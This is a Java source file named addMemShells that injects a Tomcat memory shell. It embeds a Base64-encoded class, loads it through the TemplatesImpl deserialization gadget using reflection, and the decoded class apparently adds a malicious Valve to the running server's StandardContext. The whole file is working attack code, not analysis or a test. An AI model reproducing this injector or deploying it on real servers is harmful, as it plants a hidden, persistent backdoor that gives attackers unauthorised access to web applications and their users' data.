import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


import java.lang.reflect.Field;
import java.util.Base64;

public class addMemShells {
    public addMemShells() throws Exception{
        String codes="yv66vgAAADQATgoADwAqCgArACwKACsALQcALgoABAAvCwAwADEHADIHADMKAAgAKgoABwA0CQA1ADYIADcKADgAOQcAOgcAOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGFkZFZhbHZlOwEAFXdlYmFwcENsYXNzTG9hZGVyQmFzZQEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2U7AQALc3RhbmRhcmRDdHgBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAPAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADWFkZFZhbHZlLmphdmEMABAAEQcAPQwAPgA/DABAAEEBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMAEIAQwcARAwARQBGAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEACVZhbHZlaW1wbAwAOgBHBwBIDABJAEoBAA/miJHooqvmiafooYzkuoYHAEsMAEwATQEACGFkZFZhbHZlAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMZ2V0UmVzb3VyY2VzAQAnKClMb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3Q7AQAjb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3QBAApnZXRDb250ZXh0AQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0OwEAHihMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAA4ADwAAAAAAAwABABAAEQABABIAAACBAAMAAwAAAC8qtwABuAACtgADwAAETCu2AAW5AAYBAMAAB00suwAIWbcACbYACrIACxIMtgANsQAAAAIAEwAAABoABgAAABUABAAWAA4AFwAbABgAJgAZAC4AGgAUAAAAIAADAAAALwAVABYAAAAOACEAFwAYAAEAGwAUABkAGgACAAEAGwAcAAIAEgAAAD8AAAADAAAAAbEAAAACABMAAAAGAAEAAAAfABQAAAAgAAMAAAABABUAFgAAAAAAAQAdAB4AAQAAAAEAHwAgAAIAIQAAAAQAAQAiAAEAGwAjAAIAEgAAAEkAAAAEAAAAAbEAAAACABMAAAAGAAEAAAAkABQAAAAqAAQAAAABABUAFgAAAAAAAQAdAB4AAQAAAAEAJAAlAAIAAAABACYAJwADACEAAAAEAAEAIgABACgAAAACACk=";
        byte[] decode = Base64.getDecoder().decode(codes);
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        TemplatesImpl o = (TemplatesImpl)aClass.newInstance();
        setFieldValue(o,"_name","addValve");
        setFieldValue(o,"_bytecodes",new byte[][]{decode});
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
        setFieldValue(o,"_tfactory",(TransformerFactoryImpl)aClass1.newInstance());
        o.newTransformer();
    }

    public static void setFieldValue(Object obj, String FieldName, Object setObj){
        try {
            Field field = obj.getClass().getDeclaredField(FieldName);
            field.setAccessible(true);
            field.set(obj,setObj);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
